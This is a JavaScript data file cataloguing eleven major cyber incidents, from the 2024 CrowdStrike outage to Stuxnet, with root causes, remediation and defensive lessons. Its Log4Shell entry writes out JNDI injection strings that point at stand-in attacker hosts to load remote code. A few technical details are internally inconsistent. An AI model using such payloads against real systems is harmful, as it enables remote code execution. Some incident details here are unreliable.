export const HALL_OF_INFAMY = [
  {
    id: "crowdstrike-2024",
    name: "CrowdStrike Falcon Sensor Outage",
    year: 2024,
    date: "July 19, 2024",
    category: "Kernel Resilience & Supply-Chain Availability",
    domain: "Endpoint Security",
    severity: "GLOBAL AVAILABILITY CRISIS",
    estimatedImpact: "8.5M Windows Hosts BSOD // $5.4B+ Global Economic Loss",
    mitreTags: ["Availability Failure", "Ring-0 Kernel Driver", "Channel File 291"],
    summary: "A defective rapid-response content configuration update pushed to the Windows kernel-mode CrowdStrike Falcon sensor triggered simultaneous Blue Screens of Death (BSOD) across 8.5 million critical systems worldwide.",
    whatHappened: "At 04:09 UTC on July 19, 2024, CrowdStrike distributed a routine Rapid Response Content update (`C-00000291*.sys`, Channel File 291) designed to detect newly observed named-pipe abuse techniques on Windows endpoints. Within minutes, approximately 8.5 million Windows workstations and servers across airlines, hospitals, emergency 911 centers, banks, and railway networks crashed into an unrecoverable boot loop (`PAGE_FAULT_IN_NONPAGED_AREA`), grounding over 5,000 commercial flights globally.",
    technicalRootCause: "The Falcon sensor driver (`CSAgent.sys`) executes in Windows Ring-0 (Kernel Mode) with unrestricted system privileges. Channel File 291 serves as a dynamic template instance consumed by the sensor's Content Interpreter. Due to a mismatch between the IPC template schema (which expected 21 input parameter fields) and the newly compiled Channel File 291 (which supplied 21 parameters where the runtime parser only validated bounds for 20), the kernel driver performed an out-of-bounds memory read at an invalid pointer (`0x000000000000009c`). In Ring-0 kernel space, any unhandled memory access violation immediately invokes `KeBugCheckEx()`, halting the entire operating system prior to network initialization.",
    theSolution: "Because affected machines crashed during early boot before network interfaces or remote management tools initialized—and many enterprise drives were protected by BitLocker full-disk encryption—IT administrators had to physically bootmillions of machines into Windows Safe Mode or WinRE, manually enter 48-digit BitLocker recovery keys, navigate to `C:\\Windows\\System32\\drivers\\CrowdStrike\\`, delete `C-00000291*.sys`, and reboot. CrowdStrike subsequently implemented strict schema bounds checking in the Content Interpreter and staged canary rings for all Rapid Response Content.",
    architecturalLessons: [
      "Ring-0 Kernel Minimization: Security telemetry should migrate away from Ring-0 kernel drivers toward sandboxed user-mode APIs and eBPF-style verified bytecode engines (Microsoft Windows Resiliency Initiative).",
      "Treat Content & Config as Code: Dynamic rule/template updates must undergo the same fuzz testing, static bounds checking, and progressive canary deployment rings (1% -> 10% -> 50% -> 100%) as binary driver compilation.",
      "Out-of-Band Recovery Architecture: Critical infrastructure must maintain automated out-of-band hardware management (Intel vPro / iDRAC / PXE network recovery) and accessible, non-Self-Hosted BitLocker key vaults."
    ]
  },
  {
    id: "change-healthcare-2024",
    name: "Change Healthcare ALPHV/BlackCat Ransomware",
    year: 2024,
    date: "February 21, 2024",
    category: "Ransomware & Critical Healthcare Infrastructure",
    domain: "Identity & Access Management",
    severity: "CRITICAL INFRASTRUCTURE BREACH",
    estimatedImpact: "190M+ US Patient Records // $2.87B+ Total Remediation Cost",
    mitreTags: ["T1078 Valid Accounts", "T1133 External Remote Services", "T1486 Data Encrypted for Impact"],
    summary: "Ransomware affiliate exploited a legacy Citrix remote access portal lacking Multi-Factor Authentication (MFA), paralyzing US pharmacy claims processing and exposing 190 million Americans' medical records.",
    whatHappened: "Threat actors affiliated with the ALPHV/BlackCat ransomware syndicate infiltrated Change Healthcare (a subsidiary of UnitedHealth Group that processes 15 billion healthcare transactions annually). After nine days of covert lateral movement and data exfiltration (over 4 TB of sensitive PII/PHI), the attackers deployed ransomware on February 21, 2024. Pharmacies, hospitals, and clinics nationwide were unable to process insurance claims or prescriptions for weeks.",
    technicalRootCause: "Initial access occurred on February 12, 2024, via an internet-facing Citrix Virtual Apps and Desktops portal that did not have Multi-Factor Authentication (MFA) enforced. Attackers used stolen credentials previously harvested by infostealer malware. Once inside the Citrix environment, the threat actors abused valid administrative credentials, performed Active Directory privilege escalation, extracted database credentials, exfiltrated terabytes of claims data, and encrypted core production systems.",
    theSolution: "UnitedHealth Group isolated the entire Change Healthcare network from external partner connections, rebuilt the claims clearinghouse infrastructure from scratch in clean cloud environments, rotated all certificates and credentials, enforced mandatory phishing-resistant MFA across 100% of external gateways, and ultimately paid a reported $22 million Bitcoin ransom (though a second group, RansomHub, later extorted them again after an affiliate dispute).",
    architecturalLessons: [
      "Zero Exceptions for MFA: A single legacy Citrix, VPN, or RDP portal without MFA invalidates billions of dollars in perimeter security investments. Enforce 100% FIDO2/MFA coverage across all external entry points.",
      "M&A Technical Debt Auditing: Following corporate acquisitions, newly acquired networks must be isolated via Zero Trust brokers until full identity, MFA, and EDR baselines are verified.",
      "Blast-Radius Microsegmentation: Flat internal networks allow a single compromised VDI session to reach mission-critical clearinghouse databases."
    ]
  },
  {
    id: "snowflake-2024",
    name: "Snowflake Multi-Tenant Cloud Extortion Campaign",
    year: 2024,
    date: "May–June 2024",
    category: "Cloud Identity & Infostealer Credential Stuffing",
    domain: "Cloud Security",
    severity: "MASS CLOUD DATA EXFILTRATION",
    estimatedImpact: "165+ Enterprise Tenants (AT&T, Ticketmaster, Santander) // 560M+ Records",
    mitreTags: ["T1555 Credentials from Password Stores", "T1078.004 Cloud Accounts", "T1530 Data from Cloud Storage"],
    summary: "Threat cluster UNC5537 systematically breached over 165 enterprise Snowflake customer environments using infostealer-harvested credentials on single-factor accounts lacking network allowlists.",
    whatHappened: "Rather than breaching Snowflake's core underlying platform, threat actor UNC5537 targeted hundreds of enterprise Snowflake customers—including Ticketmaster (560M users), AT&T (~110M customers' call logs), Santander, and Advance Auto Parts. Using automated reconnaissance tool 'rapeflake', the attackers logged directly into customer data warehouses, ran `SELECT *` queries across massive tables, staged the data, and extorted the victims.",
    technicalRootCause: "Third-party contractors and data engineers had previously infected their personal or unmanaged workstations with commodity infostealer malware (Lumma, RedLine, Vidar, Raccoon) years earlier. Because the victims failed to: (1) enforce MFA on Snowflake human and service accounts, (2) rotate credentials over multiple years, and (3) configure Snowflake Network Policies (IP allowlisting), the stolen username/password pairs still granted direct SQL query access to petabytes of production analytics data.",
    theSolution: "Snowflake and Mandiant released emergency IoCs (blocking 'rapeflake' client strings and anomalous ASN logins), while Snowflake introduced mandatory MFA enforcement policies for tenant administrators, forced password resets on exposed accounts, enforced OAuth/SAML SSO federation, and mandated IP network allowlists for programmatic service accounts.",
    architecturalLessons: [
      "Shared Responsibility Reality Check: Cloud SaaS data warehouses cannot protect customers who configure single-factor authentication with static passwords exposed to the entire IPv4 internet.",
      "Eliminate Static Passwords for Service Accounts: Programmatic ETL pipelines and BI tools must authenticate using key-pair cryptography (RSA/Ed25519), Workload Identity Federation (OIDC), or short-lived OAuth tokens restricted by strict IP/VPC allowlists.",
      "Infostealer Telemetry Monitoring: Proactively monitor dark-web infostealer logs for corporate email domains and contractor endpoints."
    ]
  },
  {
    id: "moveit-2023",
    name: "MOVEit Transfer Zero-Day Mass Exploitation (CVE-2023-34362)",
    year: 2023,
    date: "May 27, 2023",
    category: "Zero-Day SQL Injection & Supply-Chain MFT Breach",
    domain: "Application Security",
    severity: "CRITICAL SUPPLY-CHAIN BREACH",
    estimatedImpact: "2,770+ Organizations // 95M+ Individuals Affected Globally",
    mitreTags: ["T1190 Exploit Public-Facing App", "T1505.003 Web Shell", "T1005 Data from Local System"],
    summary: "The Cl0p ransomware group exploited a zero-day SQL injection flaw in Progress MOVEit Transfer managed file transfer appliances over Memorial Day weekend, exfiltrating data from 2,770+ organizations.",
    whatHappened: "During the US Memorial Day holiday in May 2023, the Cl0p extortion group launched a highly automated, mass-exploitation campaign against internet-facing Progress MOVEit Transfer servers. Instead of deploying noisy ransomware encryption, Cl0p silently deployed a custom `.aspx` web shell (`human2.aspx`), stole Azure Blob Storage credentials and cryptographic keys, exfiltrated sensitive files at scale, and extorted victims across government agencies, banks, airlines, and universities.",
    technicalRootCause: "CVE-2023-34362 was an unauthenticated SQL Injection vulnerability chained with an authentication bypass in the MOVEit Transfer web application (`moveitisapi.dll` and `guestaccess.aspx`). By sending crafted HTTP headers to the ISAPI extension, attackers bypassed session validation, forged an administrative session, and injected arbitrary SQL queries into the backend database (MSSQL/MySQL/Azure SQL). Using SQL injection or .NET deserialization primitives, the attackers wrote the `human2.aspx` web shell directly to the web root and extracted AES encryption keys to decrypt stored files.",
    theSolution: "Progress Software issued emergency patches disabling HTTP/HTTPS traffic until upgraded, provided indicators for `human2.aspx` removal, and forced rotation of all Azure Blob Storage keys and database credentials. Organizations migrated MFT appliances behind strict mutual-TLS (mTLS) gateways and Zero Trust proxies.",
    architecturalLessons: [
      "Managed File Transfer (MFT) Appliances are Tier-0 Targets: After Accellion FTA, GoAnywhere, and MOVEit, edge MFT servers must never sit directly on the public internet without mTLS or IP allowlisting.",
      "Ephemeral Storage on File Gateways: File transfer appliances should automatically purge transferred payloads immediately after delivery rather than serving as long-term archives of unmasked PII.",
      "Parameterized Queries Everywhere: Complex header forwarding between C++ ISAPI filters and .NET backends must never concatenate raw strings into SQL statements."
    ]
  },
  {
    id: "colonial-pipeline-2021",
    name: "Colonial Pipeline DarkSide Ransomware Shutdown",
    year: 2021,
    date: "May 7, 2021",
    category: "OT/IT Convergence & Critical Energy Infrastructure",
    domain: "OT / ICS Security",
    severity: "CRITICAL ENERGY EMERGENCY",
    estimatedImpact: "5,500-Mile Fuel Pipeline Halted 6 Days // 45% US East Coast Fuel Supply",
    mitreTags: ["T1078 Valid Accounts", "T1133 VPN Single-Factor", "IT-OT Convergence Shutdown"],
    summary: "A single compromised password on an inactive legacy VPN account lacking MFA allowed DarkSide ransomware operators to breach Colonial Pipeline's IT network, forcing a precautionary 6-day shutdown of the largest fuel pipeline in the United States.",
    whatHappened: "On May 7, 2021, Colonial Pipeline discovered ransomware notes from the DarkSide RaaS group across its corporate IT enterprise systems after attackers stole 100 GB of data in two hours. Fearing the attackers might pivot from the corporate IT billing/ERP environment into the Operational Technology (OT) SCADA systems controlling 5,500 miles of pressurized gasoline and jet fuel pipelines, Colonial halted all pipeline operations for 6 days, triggering panic buying and fuel shortages across the US East Coast.",
    technicalRootCause: "Attackers gained entry on April 29, 2021, through an inactive, legacy Cisco VPN profile belonging to an employee who had reused their password on another breached website. Although the VPN account was no longer actively used, it had never been deprovisioned in Active Directory and did not require Multi-Factor Authentication (MFA). Furthermore, insufficient architectural confidence in the isolation boundary between the corporate IT billing systems and the OT pipeline control network forced leadership to shut down physical operations.",
    theSolution: "Colonial Pipeline disconnected its IT systems, coordinated with CISA and Mandiant to eradicate DarkSide persistence, rebuilt Active Directory, enforced hardware MFA across all remote access, and paid a 75 BTC ($4.4M) ransom (of which the DOJ/FBI later seized back 63.7 BTC by compromising DarkSide's cryptocurrency wallet key).",
    architecturalLessons: [
      "Strict IT/OT Purdue Model Isolation: Industrial physical operations (Purdue Levels 0–2) must be separated from corporate IT/billing (Levels 4–5) via an Industrial DMZ (Level 3.5) and unidirectional hardware Data Diodes so an IT ransomware event never forces a physical plant shutdown.",
      "Automated Identity Lifecycle & Deprovisioning: Orphaned/inactive VPN and AD accounts must be automatically disabled after 30 days of inactivity.",
      "Manual Island-Mode Operations: Critical infrastructure operators must drill manual/local control procedures to sustain physical flow when enterprise ERP/billing software goes offline."
    ]
  },
  {
    id: "log4shell-2021",
    name: "Log4Shell: Apache Log4j2 JNDI Remote Code Execution (CVE-2021-44228)",
    year: 2021,
    date: "December 9, 2021",
    category: "Ubiquitous Open-Source Supply Chain Zero-Day",
    domain: "Application Security",
    severity: "CVSS 10.0 UBIQUITOUS CRITICAL",
    estimatedImpact: "Hundreds of Millions of Java Servers, Cloud Services & Appliances",
    mitreTags: ["T1190 Exploit Public-Facing App", "JNDI Lookup Injection", "CVE-2021-44228"],
    summary: "A single 15-character string (`${jndi:ldap://...}`) logged by Apache Log4j2 triggered unauthenticated Remote Code Execution across millions of Java servers worldwide.",
    whatHappened: "In December 2021, a critical CVSS 10.0 vulnerability was disclosed in `log4j-core`, the ubiquitous Java logging library embedded in everything from Minecraft servers and Apple iCloud to VMware vCenter, enterprise banking backends, and cloud infrastructure. Attackers simply placed `${jndi:ldap://attacker.com/a}` inside HTTP User-Agent headers, login forms, or chat messages; whenever the backend server logged the string, it fetched and executed remote attacker Java bytecode.",
    technicalRootCause: "Log4j2 version 2.0-beta9 through 2.14.1 included a feature called 'Message Lookup Substitution' enabled by default. When formatting any log message, Log4j parsed `${prefix:name}` expressions recursively. Crucially, it supported the Java Naming and Directory Interface (`jndi:`), which allowed dynamic lookups over `ldap://`, `rmi://`, `ldaps://`, and `dns://`. When Log4j evaluated `${jndi:ldap://evil.com/Exploit}`, the JVM connected out to the attacker's rogue LDAP server, downloaded a serialized Java `.class` file, and deserialized/executed it directly in the JVM process memory.",
    theSolution: "Apache released Log4j 2.15.0, 2.16.0, and ultimately 2.17.1+, which completely disabled message lookup substitution by default and removed JNDI LDAP remote class loading unless explicitly whitelisted. Organizations used SBOM scanners (Trivy, Syft, Grype) to hunt down nested `.jar` archives (JAR-inside-WAR-inside-EAR) and deployed strict egress firewall rules blocking outbound LDAP (389/636) and RMI (1099) traffic from application servers.",
    architecturalLessons: [
      "Never Evaluate Untrusted Data as Code in Logging Sinkholes: Logging libraries must treat logged strings strictly as inert plaintext literals, never as executable expression templates.",
      "Default-Deny Egress Filtering: Why could production web servers initiate outbound TCP connections to random internet IPs on port 389 (LDAP)? Strict egress firewalling breaks the JNDI callback chain immediately.",
      "Deep Transitive SBOM Visibility: Most enterprises didn't know they used Log4j because it was buried 4 layers deep as a transitive dependency inside commercial vendor appliances."
    ]
  },
  {
    id: "solarwinds-2020",
    name: "SolarWinds Orion SUNBURST Supply-Chain Compromise",
    year: 2020,
    date: "December 13, 2020",
    category: "Nation-State CI/CD Build Pipeline Poisoning",
    domain: "Application Security",
    severity: "TIER-0 NATION-STATE ESPIONAGE",
    estimatedImpact: "18,000+ Organizations Installed Backdoor // 9 US Federal Agencies & FireEye",
    mitreTags: ["T1195.002 Compromise Software Supply Chain", "T1552.004 Private Keys", "Golden SAML"],
    summary: "APT29 (Nobelium / Cozy Bear) compromised SolarWinds' internal software build pipeline, injecting the stealthy SUNBURST backdoor into digitally signed Orion network monitoring updates distributed to 18,000 customers.",
    whatHappened: "Discovered by FireEye in December 2020 after investigating a theft of their own Red Team tools, Russian foreign intelligence (SVR / APT29) had silently compromised SolarWinds' build environment months earlier. Between March and June 2020, SolarWinds unknowingly shipped trojanized, legitimately digitally signed updates (`SolarWinds.BusinessLayerHost.dll`) of its Orion IT monitoring platform to ~18,000 enterprise and government customers. The attackers then selectively activated hands-on-keyboard espionage against high-value targets (US Treasury, DOJ, Commerce, Microsoft, FireEye).",
    technicalRootCause: "Rather than modifying source code in Git (which would leave commit audit trails), the attackers deployed a resident build-server implant (`SUNSPOT`) that monitored running processes on the SolarWinds build server for `MSBuild.exe`. Whenever the Orion solution was being compiled, `SUNSPOT` swapped a clean C# source file (`InventoryManager.cs`) in milliseconds with a version containing the `SUNBURST` backdoor right before compilation, then restored the original file immediately after `MSBuild.exe` finished. Consequently, the malicious DLL was signed with SolarWinds' official code-signing certificate. Once deployed at victim sites, SUNBURST lay dormant for 12–14 days, mimicked legitimate Orion XML web traffic (`AVSVMCloud.com`), and enabled attackers to steal AD FS token-signing certificates to mint forged 'Golden SAML' tokens for cloud persistence.",
    theSolution: "SolarWinds revoked compromised code-signing certificates, rebuilt its build environment using ephemeral, hermetic, multi-stage verification pipelines, and released clean patches. Victims had to isolate Orion servers, rotate Active Directory `krbtgt` accounts twice, and revoke/re-issue all on-premises AD FS SAML token-signing certificates.",
    architecturalLessons: [
      "SLSA Level 3/4 Hermetic & Reproducible Builds: Build servers must be ephemeral, immutable, isolated from corporate networks, and verified via deterministic reproducible compilation so source-to-binary tampering is mathematically detectable.",
      "Zero Trust for Management & Monitoring Tools: Network management appliances (Orion) often hold god-mode credentials across the entire enterprise; their outbound internet access must be tightly restricted.",
      "Protect Identity Signing Keys in Hardware HSMs: SAML token-signing private keys must reside inside FIPS 140-3 Hardware Security Modules (HSMs) so they cannot be exported by an administrator or attacker."
    ]
  },
  {
    id: "notpetya-2017",
    name: "NotPetya Global Destructive Wiper Attack",
    year: 2017,
    date: "June 27, 2017",
    category: "Destructive Wiper Worm & Supply-Chain Update Hijack",
    domain: "Endpoint Security",
    severity: "MOST DESTRUCTIVE CYBERATTACK IN HISTORY",
    estimatedImpact: "$10 Billion+ Global Damage (Maersk, Merck, FedEx/TNT, Mondelēz)",
    mitreTags: ["T1195.002 Supply Chain", "T1210 EternalBlue", "T1003.001 LSASS Mimikatz", "T1561.002 Disk Structure Wipe"],
    summary: "Sandworm (GRU Unit 74455) hijacked the Ukrainian M.E.Doc tax software update server to launch NotPetya—a self-propagating worm combining EternalBlue and Mimikatz that masqueraded as ransomware while permanently destroying Master Boot Records globally.",
    whatHappened: "On June 27, 2017, a devastating worm erupted from Ukraine and spread within minutes across multinational corporations worldwide. Shipping giant Maersk lost 45,000 endpoints and 4,000 servers (including all 150 Domain Controllers except one offline server in Ghana saved by a power outage); pharmaceutical giant Merck, FedEx subsidiary TNT Express, Saint-Gobain, and Reckitt Benckiser suffered hundreds of millions of dollars in operational paralysis.",
    technicalRootCause: "1) Initial Supply-Chain Vector: Attackers compromised the update servers of M.E.Doc, tax accounting software used by nearly every business operating in Ukraine.\n2) Dual-Engine Worm Propagation: Once inside a single workstation on a multinational corporate WAN (e.g., Maersk's small office in Odessa, Ukraine), NotPetya used a dual propagation engine: it ran an embedded copy of `Mimikatz` (`lsass.exe` credential dumping) to extract plaintext Domain Admin passwords/hashes from RAM and spread via `PsExec`/`WMIC` to fully patched machines, AND simultaneously fired the NSA `EternalBlue` (`MS17-010`) and `EternalRomance` SMBv1 exploits to infect unpatched machines.\n3) Irreversible Destruction: Although NotPetya displayed a $300 Bitcoin ransom screen, it generated a random 64-byte Salsa20 encryption key for the Master File Table (MFT) and immediately discarded the key without saving it—making decryption mathematically impossible (a pure destructive wiper).",
    theSolution: "Because decryption was impossible, victims had to rebuild tens of thousands of servers and workstations from bare metal. Maersk famously flew a single surviving hard drive from a Lagos/Ghana branch office (which had been offline due to a local blackout during the attack) to London to reconstruct its global Active Directory forest.",
    architecturalLessons: [
      "Patching Alone Doesn't Stop Credential-Harvesting Worms: Even hosts patched against EternalBlue (`MS17-010`) were wiped by NotPetya because it stole valid Domain Admin credentials from `LSASS` memory via Mimikatz and used legitimate Windows WMI/PsExec.",
      "Credential Hygiene & LSASS Protection: Enable Windows Credential Guard (VBS), enforce Tiered Administration (never log into workstations with Domain Admin accounts), and disable SMBv1 and NTLMv1.",
      "Offline Air-Gapped Active Directory Backups: Always maintain immutable, offline backups of Tier-0 Active Directory Domain Controllers."
    ]
  },
  {
    id: "wannacry-2017",
    name: "WannaCry EternalBlue SMBv1 Global Ransomware Worm",
    year: 2017,
    date: "May 12, 2017",
    category: "Network Worm & SMBv1 Kernel Exploitation",
    domain: "Network Security",
    severity: "GLOBAL PANDEMIC RANSOMWARE WORM",
    estimatedImpact: "230,000+ Computers Across 150 Countries // UK NHS Paralyzed // $4B–$8B Loss",
    mitreTags: ["T1210 Exploitation of Remote Services", "MS17-010 EternalBlue", "SMBv1 TCP Port 445"],
    summary: "Lazarus Group weaponized the leaked NSA 'EternalBlue' SMBv1 kernel exploit into a self-propagating ransomware worm that infected 230,000+ machines in 150 countries within hours, crippling the UK National Health Service (NHS).",
    whatHappened: "On Friday, May 12, 2017, WannaCry (`WannaCrypt0r 2.0`) began spreading autonomously across the global internet and internal corporate LANs without requiring any user clicks or phishing emails. Within hours, 80 UK National Health Service (NHS) hospital trusts were forced to divert ambulances and cancel surgeries; Telefónica, Deutsche Bahn railway terminals, Renault auto plants, and FedEx were hit simultaneously.",
    technicalRootCause: "In April 2017, the Shadow Brokers group leaked `EternalBlue` (CVE-2017-0144 / MS17-010), an exploit targeting a buffer overflow in the Windows Server Message Block version 1 (`SMBv1`) kernel driver (`srv.sys`). When handling crafted `FEA` (File Extended Attributes) structures in `SMB_COM_TRANSACTION2` packets over TCP Port 445, an integer conversion error (`DWORD` to `WORD`) allowed unauthenticated remote kernel pool memory corruption and Ring-0 code execution. WannaCry paired EternalBlue with the `DoublePulsar` kernel backdoor to scan both internal RFC1918 LAN subnets and random public IPv4 addresses on TCP 445, encrypting files with RSA-2048 + AES-128-CBC.",
    theSolution: "Security researcher Marcus Hutchins (`@MalwareTechBlog`) discovered an unregistered domain (`iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com`) hardcoded in the WannaCry binary as an anti-sandbox check: if an HTTP request to that domain succeeded, WannaCry exited without encrypting. Registering the domain for $10.69 triggered a global 'kill switch' that halted new infections on internet-connected hosts. Microsoft also issued emergency out-of-band `MS17-010` patches even for end-of-life Windows XP and Server 2003.",
    architecturalLessons: [
      "Never Expose SMB (TCP 445) or RDP (TCP 3389) to the Internet: Perimeter firewalls must unconditionally drop inbound and outbound SMB traffic.",
      "Deprecate Legacy Protocols (SMBv1): SMBv1 was designed in the 1980s without encryption or modern bounds safety; disable `FS-SMB1` across all endpoints and servers.",
      "East-West Workstation Firewalling: Workstations in an office subnet almost never need to accept inbound TCP 445 connections from peer workstations—host firewall rules block worm lateral propagation instantly."
    ]
  },
  {
    id: "equifax-2017",
    name: "Equifax Apache Struts CVE-2017-5638 Data Breach",
    year: 2017,
    date: "May–July 2017",
    category: "Unpatched Web Framework & Expired TLS Visibility Blindness",
    domain: "Application Security",
    severity: "CATASTROPHIC CONSUMER PII BREACH",
    estimatedImpact: "147.9 Million Consumers' SSNs, Birth Dates & Credit Data // $1.4B+ Settlement",
    mitreTags: ["T1190 Exploit Public-Facing App", "CVE-2017-5638 OGNL Injection", "Expired TLS Inspection Cert"],
    summary: "An unpatched Apache Struts 2 vulnerability combined with an expired SSL/TLS inspection certificate allowed attackers to silently exfiltrate 147.9 million Americans' Social Security Numbers over 76 days.",
    whatHappened: "Between May 13 and July 30, 2017, attackers breached Equifax's online credit dispute portal, deployed web shells, discovered unencrypted credentials stored in plaintext configuration files on a file share, pivoted across 48 unrelated internal databases, ran 9,000 queries extracting 147.9 million consumers' Social Security Numbers, driver's license numbers, and birth dates, and exfiltrated the data in encrypted chunks over 76 days without triggering a single SOC alert.",
    technicalRootCause: "1) Vulnerability Management Failure: On March 7, 2017, Apache disclosed CVE-2017-5638, a critical Remote Code Execution flaw in the Apache Struts 2 Jakarta Multipart parser where malformed `Content-Type` HTTP headers executed arbitrary OGNL (Object-Graph Navigation Language) expressions. Although Equifax's security team circulated a patch directive on March 9, their automated vulnerability scanner failed to locate the legacy Struts dependency on the ACIS dispute portal.\n2) Network Visibility Blindness: Even worse, the network security appliance responsible for decrypting and inspecting outbound HTTPS traffic from the ACIS environment had an **expired SSL/TLS certificate for 19 months**. Because TLS decryption was silently failing, the IDS/IPS was completely blind for 76 days until an engineer finally renewed the certificate on July 29, 2017—and immediately saw live data exfiltration to China.",
    theSolution: "Equifax took the ACIS portal offline, retired the legacy Java monolith, spent $1.5 billion rebuilding its entire cloud and security architecture from the ground up, implemented automated certificate lifecycle management, enforced network microsegmentation between databases, and eliminated plaintext credential files.",
    architecturalLessons: [
      "Software Composition Analysis (SCA) over Network Scanners Alone: External port scanners often miss deeply embedded framework libraries like Apache Struts; maintain an accurate SBOM tied to build pipelines.",
      "Monitor the Monitors (TLS Inspection Health): Security sensors with expired TLS certificates create a fatal false sense of security. Automate X.509 certificate lifecycle monitoring.",
      "Zero Trust Secrets Management: Never store database credentials in plaintext `.properties` or `.xml` files on shared network drives; use HashiCorp Vault or Cloud KMS."
    ]
  },
  {
    id: "stuxnet-2010",
    name: "Stuxnet: Operation Olympic Games ICS/SCADA Sabotage",
    year: 2010,
    date: "June 2010",
    category: "Cyber-Physical Kinetic Weapon & PLC Rootkit",
    domain: "OT / ICS Security",
    severity: "FIRST CYBER-PHYSICAL WEAPON",
    estimatedImpact: "~1,000 IR-1 Uranium Enrichment Centrifuges Physically Destroyed at Natanz",
    mitreTags: ["T0843 Program Download", "T0836 Modify Parameter", "T0856 Spoof Reporting Message", "4 Windows Zero-Days"],
    summary: "The world's first known cyber-physical weapon jumped an air gap via USB drives, leveraged four Windows zero-days, and injected a stealthy PLC rootkit into Siemens S7-315 controllers to physically destroy uranium enrichment centrifuges while playing back 'normal' telemetry to operators.",
    whatHappened: "Targeting the air-gapped Natanz nuclear enrichment facility in Iran, Stuxnet infected engineering laptops owned by outside industrial contractors. When those contractors carried infected USB flash drives inside the air-gapped facility, Stuxnet spread across the internal LAN until it located Windows workstations running Siemens STEP 7 industrial engineering software connected to Siemens S7-315 and S7-417 Programmable Logic Controllers (PLCs) driving IR-1 gas centrifuges.",
    technicalRootCause: "Stuxnet remains a masterpiece of multi-stage offensive engineering:\n1) Four Windows Zero-Days: It used `CVE-2010-2568` (`.LNK` shortcut file execution simply by viewing the USB drive in Windows Explorer), `CVE-2008-4250` (`MS08-067` Server Service RPC), a Print Spooler RCE (`CVE-2010-2729`), and two Win32k kernel privilege escalation zero-days, plus stolen real digital certificates from Realtek and JMicron to load signed kernel drivers.\n2) Surgical Target Validation: Stuxnet did nothing unless it verified the machine ran Siemens `STEP 7`, had a Profibus communications processor (`CP 342-5`), and was connected to specific Variable Frequency Drives (VFDs) manufactured by Fararo Paya (Iran) or Vacon (Finland) operating between 807 Hz and 1,210 Hz.\n3) PLC Man-in-the-Middle Rootkit (`s7otbxdx.dll`): Stuxnet trojanized the STEP 7 communication DLL, injected rogue ladder-logic blocks (`OB1` / `OB35`) onto the PLC to covertly spin the centrifuges up to 1,410 Hz (causing harmonic resonance and rotor disintegration) and down to 2 Hz, while simultaneously replaying 21 seconds of pre-recorded 'normal' 1,064 Hz telemetry to the human operators' HMI screens in the control room.",
    theSolution: "Siemens issued patches for STEP 7 DLL hijacking and hardcoded database passwords; Microsoft patched all four Windows zero-days; Realtek and JMicron revoked their compromised code-signing certificates; and industrial facilities implemented strict USB port locks, out-of-band analog physics sensors, and passive ICS network anomaly detection.",
    architecturalLessons: [
      "Air Gaps Are Not Impervious: Transient assets—contractor laptops, USB flash drives, calibration tools—routinely bridge air-gapped OT networks. Enforce hardware USB locks and dedicated kiosks.",
      "HMI Telemetry Can Lie (The Replay Fallacy): If the engineering workstation or PLC firmware is compromised, digital HMI screens will show 'All Green' while physical equipment tears itself apart. Critical safety interlocks (SIS) must use independent, hardwired analog relays.",
      "Cryptographic Firmware & Ladder-Logic Signing: PLCs must verify cryptographic signatures on all ladder-logic uploads and enforce physical key-switch 'RUN-ONLY' modes."
    ]
  }
];
